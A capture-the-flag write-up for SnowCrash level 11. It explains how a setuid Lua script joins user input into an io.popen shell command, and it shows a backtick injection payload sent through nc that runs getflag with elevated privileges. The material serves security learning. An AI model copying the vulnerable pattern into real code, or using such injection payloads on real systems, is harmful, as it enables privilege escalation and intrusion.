# LEVEL11

## Analysis

## Inspection

In this home directory, we have a lua script:
```bash
    level11@SnowCrash:~$ ls -la
    [...]
    -rwsr-sr-x  1 flag11  level11  668 Mar  5  2016 level11.lua
    [...]
```
```
    $ file level11.lua
    level11.lua: setuid setgid a lua script, ASCII text executable
```

## investigation

We use `cat` to read the content of this script:
```bash
    $ cat level11.lua 
    #!/usr/bin/env lua
    local socket = require("socket")
    local server = assert(socket.bind("127.0.0.1", 5151))

    function hash(pass)
    prog = io.popen("echo "..pass.." | sha1sum", "r")
    data = prog:read("*all")
    prog:close()

    data = string.sub(data, 1, 40)

    return data
    end


    while 1 do
    local client = server:accept()
    client:send("Password: ")
    client:settimeout(60)
    local l, err = client:receive()
    if not err then
        print("trying " .. l)
        local h = hash(l)

        if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
            client:send("Erf nope..\n");
        else
            client:send("Gz you dumb*\n")
        end

    end

    client:close()
    end
```

This programs listens to port `5151` but the important part lies in the function `hash`. The user input `pass` is directly concatenated into shell command, executed via `io.popen`. Lua script runs with setuid privileges and shell interprets metacharacters
In short, the program constructs a shell command unsafely using string concatenation inside `io.popen`.This means it is possible to execute lua subprocess command injection via unsanitized string concatenation.

## Exploitation

Here give a command as input to the requested password:
```bash
    level11@SnowCrash:~$ nc localhost 5151
    Password: `getflag` > /tmp/token
```
Although the server returns:
```
    Erf nope..
```
the injected command still executes successfully:
```bash
    $ cat /tmp/token
    Check flag.Here is your token : XXXXXXXXXXXXXXXXXXXXXXXXXXXX
```

## Takeaways

- Lua io.popen() executes commands via a shell, making it vulnerable when using string concatenation
- Unsanitized user input in shell command construction leads to command injection
- Backticks and shell operators can be evaluated before or during remote execution
